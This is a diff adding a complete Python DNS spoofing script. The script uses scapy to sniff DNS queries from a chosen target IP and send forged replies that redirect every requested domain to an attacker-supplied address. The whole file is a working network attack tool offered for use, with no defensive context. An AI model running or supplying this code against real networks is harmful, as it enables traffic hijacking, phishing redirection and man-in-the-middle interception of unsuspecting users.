@@ -1,0 +1,27 @@
+from scapy.all import *
+from dnslib import DNSRecord
+
+def dns_spoof(packet, target_ip, redirect_ip):
+    # Check if packet is a DNS request from the target device
+    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
+        if packet[IP].src == target_ip:  # Only spoof for the target device
+            requested_domain = packet[DNSQR].qname.decode()
+
+            print(f"[+] Spoofing {target_ip} -> {requested_domain} -> {redirect_ip}")
+
+            # Create a fake DNS response
+            dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
+                           UDP(dport=packet[UDP].sport, sport=53) / \
+                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
+                               an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=redirect_ip))
+
+            send(dns_response, verbose=0)  # Send the fake response
+
+# Ask for target IP and redirect IP
+target_ip = input("Enter the target IP address: ")
+redirect_ip = input("Enter the redirect IP address: ")
+
+# Start sniffing DNS packets only from the target device
+print(f"[*] Redirecting {target_ip} to {redirect_ip}")
+sniff(filter=f"udp port 53 and src host {target_ip}", prn=lambda packet: dns_spoof(packet, target_ip, redirect_ip), store=0)
+
